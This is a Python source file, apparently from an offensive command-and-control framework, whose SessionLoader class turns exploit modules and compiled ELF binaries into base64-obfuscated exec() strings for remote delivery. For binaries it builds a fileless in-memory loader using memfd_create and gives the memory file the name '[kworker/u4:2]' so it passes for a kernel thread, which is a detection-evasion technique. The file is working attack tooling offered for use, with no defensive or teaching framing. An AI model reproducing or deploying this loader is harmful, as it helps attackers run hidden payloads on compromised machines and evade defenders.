import os
import base64
import importlib.util

class SessionLoader:
    @staticmethod
    def load(file_path):
        """
        Intelligently detects file types and returns a Python eval() loader string.
        Returns a tuple: (loader_string, function_name_to_trigger)
        """
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
            
        ext = os.path.splitext(file_path)[1].lower()
        
        if ext == '.py':
            return SessionLoader._load_python(file_path)
        else:
            # Treat everything else (.elf, .bin, .out, or no extension) as a compiled binary
            return SessionLoader._load_elf(file_path)
            
    @staticmethod
    def _load_python(file_path):
        spec = importlib.util.spec_from_file_location("dynamic_loader", file_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        
        if hasattr(module, 'exploit'):
            return module.exploit(silent=True), "function"
        elif hasattr(module, 'Start'):
            return module.Start(silent=True), "function"
            
        return None, None
        
    @staticmethod
    def _load_elf(file_path):
        # Read the raw binary data
        with open(file_path, "rb") as f:
            elf_data = f.read()
            
        # Base64 encode the binary to safely transport it via the Python wrapper
        elf_b64 = base64.b64encode(elf_data).decode('utf-8')
        
        # Generate a safe, dynamic function name based on the binary's filename
        safe_name = os.path.basename(file_path).replace('.', '_').replace('-', '_').replace(' ', '_')
        func_name = f"run_{safe_name}"
        
        # Pure-Python memfd_create wrapper
        payload = f"""
def {func_name}():
    _c = __import__('ctypes')
    _o = __import__('os')
    _s = __import__('subprocess')
    _b = __import__('base64')
    
    try:
        elf_data = _b.b64decode("{elf_b64}")
        libc = _c.CDLL(None)
        proc_name = b"[kworker/u4:2]"
        
        try: fd = libc.memfd_create(proc_name, 1)
        except AttributeError: fd = libc.syscall(319, proc_name, 1)
        
        if fd < 0: print("[-] memfd_create failed."); return
        _o.write(fd, elf_data)
        
        print("[*] Launching compiled ELF from RAM (FD: " + str(fd) + ")...")
        proc = _s.run(["/proc/self/fd/" + str(fd)], capture_output=True, text=True)
        
        print("[+] Execution Complete. Output:\\n" + proc.stdout)
        if proc.stderr: print(proc.stderr)
    except Exception as e: print("[-] Loader Error: " + str(e))
"""
        # Base64 encode the entire wrapper to stream it flawlessly over the TLS socket
        encoded_payload = base64.b64encode(payload.encode()).decode()
        loader = f"exec(__import__('base64').b64decode('{encoded_payload}'))"
        
        return loader, func_name